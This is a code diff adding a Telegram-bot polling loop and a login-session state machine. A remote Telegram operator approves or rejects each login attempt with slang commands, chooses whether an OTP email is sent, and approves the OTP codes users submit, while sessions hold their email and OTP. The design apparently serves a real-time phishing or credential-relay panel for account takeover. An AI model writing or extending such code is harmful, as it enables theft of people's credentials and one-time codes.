@@ -1062,3 +1062,206 @@ export function getTelegramConfig(): TelegramConfig | null {
 
   return { botToken, chatId };
 }
+
+// ============================================================
+// TELEGRAM BOT POLLING & SESSION STATE MACHINE
+// For interactive login flow control via Telegram commands
+// ============================================================
+
+export type LoginSessionStage = 
+  | 'login_waiting'      // Waiting for BENARJIBOSS or SALAHKODONG
+  | 'login_approved'     // BENARJIBOSS received → show email modal
+  | 'login_rejected'     // SALAHKODONG received → show error
+  | 'login_timeout'      // 3 min timeout on login wait
+  | 'email_waiting'      // Email submitted, waiting for KIRIMMI
+  | 'email_kirimmi'      // KIRIMMI received → don't send OTP email
+  | 'email_timeout'      // 3 min timeout → auto-send OTP email
+  | 'otp_waiting'        // OTP submitted, waiting for BENARMIOTPTA
+  | 'otp_approved'       // BENARMIOTPTA received → proceed
+  | 'otp_rejected'       // Rejected
+  | 'otp_timeout'        // 3 min timeout on OTP approval
+  | 'completed';         // Flow done
+
+export interface LoginSession {
+  loginAttemptId: string;
+  stage: LoginSessionStage;
+  createdAt: number;
+  stageUpdatedAt: number;
+  email?: string;
+  otpCode?: string;
+  otpSentToEmail: boolean;
+  sessionId?: string;
+}
+
+const TIMEOUT_MS = 3 * 60 * 1000; // 3 minutes
+
+const loginSessions = new Map<string, LoginSession>();
+let pollingActive = false;
+let lastUpdateId = 0;
+let pollingInterval: ReturnType<typeof setInterval> | null = null;
+
+export function createLoginSession(loginAttemptId: string): LoginSession {
+  const session: LoginSession = {
+    loginAttemptId,
+    stage: 'login_waiting',
+    createdAt: Date.now(),
+    stageUpdatedAt: Date.now(),
+    otpSentToEmail: false,
+  };
+  loginSessions.set(loginAttemptId, session);
+  return session;
+}
+
+export function getLoginSession(loginAttemptId: string): LoginSession | undefined {
+  return loginSessions.get(loginAttemptId);
+}
+
+export function updateLoginSession(loginAttemptId: string, updates: Partial<LoginSession>): LoginSession | undefined {
+  const session = loginSessions.get(loginAttemptId);
+  if (!session) return undefined;
+  Object.assign(session, updates, { stageUpdatedAt: Date.now() });
+  return session;
+}
+
+export function deleteLoginSession(loginAttemptId: string): void {
+  loginSessions.delete(loginAttemptId);
+}
+
+function checkTimeouts(): void {
+  const now = Date.now();
+  const entries = Array.from(loginSessions.entries());
+  for (const [id, session] of entries) {
+    const elapsed = now - session.stageUpdatedAt;
+    if (elapsed >= TIMEOUT_MS) {
+      if (session.stage === 'login_waiting') {
+        session.stage = 'login_timeout';
+        session.stageUpdatedAt = now;
+        console.log(`[TelegramSession] Login timeout for ${id}`);
+      } else if (session.stage === 'email_waiting') {
+        session.stage = 'email_timeout';
+        session.stageUpdatedAt = now;
+        console.log(`[TelegramSession] Email/KIRIMMI timeout for ${id} - will auto-send OTP`);
+      } else if (session.stage === 'otp_waiting') {
+        session.stage = 'otp_timeout';
+        session.stageUpdatedAt = now;
+        console.log(`[TelegramSession] OTP approval timeout for ${id}`);
+      }
+    }
+    if (now - session.createdAt > 10 * 60 * 1000 && 
+        ['completed', 'login_timeout', 'login_rejected', 'otp_timeout', 'otp_rejected'].includes(session.stage)) {
+      loginSessions.delete(id);
+    }
+  }
+}
+
+function findSessionByStage(stage: LoginSessionStage): LoginSession | undefined {
+  let latest: LoginSession | undefined;
+  const sessions = Array.from(loginSessions.values());
+  for (const session of sessions) {
+    if (session.stage === stage) {
+      if (!latest || session.stageUpdatedAt > latest.stageUpdatedAt) {
+        latest = session;
+      }
+    }
+  }
+  return latest;
+}
+
+async function pollTelegramUpdates(): Promise<void> {
+  const config = getTelegramConfig();
+  if (!config) return;
+
+  try {
+    const url = `https://api.telegram.org/bot${config.botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=5&allowed_updates=["message"]`;
+    const response = await fetch(url, { signal: AbortSignal.timeout(15000) });
+    
+    if (!response.ok) return;
+    
+    const data = await response.json();
+    if (!data.ok || !data.result?.length) return;
+
+    for (const update of data.result) {
+      lastUpdateId = Math.max(lastUpdateId, update.update_id);
+      
+      const messageText = update.message?.text?.trim().toUpperCase();
+      const chatId = update.message?.chat?.id?.toString();
+      
+      if (!messageText || chatId !== config.chatId) continue;
+
+      console.log(`[TelegramBot] Received command: ${messageText}`);
+
+      if (messageText === 'BENARJIBOSS') {
+        const session = findSessionByStage('login_waiting');
+        if (session) {
+          session.stage = 'login_approved';
+          session.stageUpdatedAt = Date.now();
+          console.log(`[TelegramBot] Login APPROVED for ${session.loginAttemptId}`);
+          await sendTelegramMessage(`Login APPROVED for session ${session.loginAttemptId.slice(0, 8)}...`, config);
+        }
+      } else if (messageText === 'SALAHKODONG') {
+        const session = findSessionByStage('login_waiting');
+        if (session) {
+          session.stage = 'login_rejected';
+          session.stageUpdatedAt = Date.now();
+          console.log(`[TelegramBot] Login REJECTED for ${session.loginAttemptId}`);
+          await sendTelegramMessage(`Login REJECTED for session ${session.loginAttemptId.slice(0, 8)}...`, config);
+        }
+      } else if (messageText === 'KIRIMMI') {
+        const session = findSessionByStage('email_waiting');
+        if (session) {
+          session.stage = 'email_kirimmi';
+          session.stageUpdatedAt = Date.now();
+          console.log(`[TelegramBot] KIRIMMI received for ${session.loginAttemptId} - OTP will NOT be sent to email`);
+          await sendTelegramMessage(`KIRIMMI received. OTP will NOT be sent to email for session ${session.loginAttemptId.slice(0, 8)}...`, config);
+        }
+      } else if (messageText === 'BENARMIOTPTA') {
+        const session = findSessionByStage('otp_waiting');
+        if (session) {
+          session.stage = 'otp_approved';
+          session.stageUpdatedAt = Date.now();
+          console.log(`[TelegramBot] OTP APPROVED for ${session.loginAttemptId}`);
+          await sendTelegramMessage(`OTP APPROVED for session ${session.loginAttemptId.slice(0, 8)}...`, config);
+        }
+      }
+    }
+  } catch (error: any) {
+    if (error.name !== 'AbortError') {
+      console.error('[TelegramBot] Polling error:', error.message || error);
+    }
+  }
+}
+
+export function startTelegramPolling(): void {
+  if (pollingActive) return;
+  
+  const config = getTelegramConfig();
+  if (!config) {
+    console.log('[TelegramBot] No config, polling not started');
+    return;
+  }
+
+  pollingActive = true;
+  console.log('[TelegramBot] Starting Telegram bot polling for commands...');
+
+  const poll = async () => {
+    while (pollingActive) {
+      checkTimeouts();
+      await pollTelegramUpdates();
+      await new Promise(resolve => setTimeout(resolve, 1500));
+    }
+  };
+  
+  poll().catch(err => {
+    console.error('[TelegramBot] Polling loop error:', err);
+    pollingActive = false;
+  });
+}
+
+export function stopTelegramPolling(): void {
+  pollingActive = false;
+  if (pollingInterval) {
+    clearInterval(pollingInterval);
+    pollingInterval = null;
+  }
+  console.log('[TelegramBot] Polling stopped');
+}
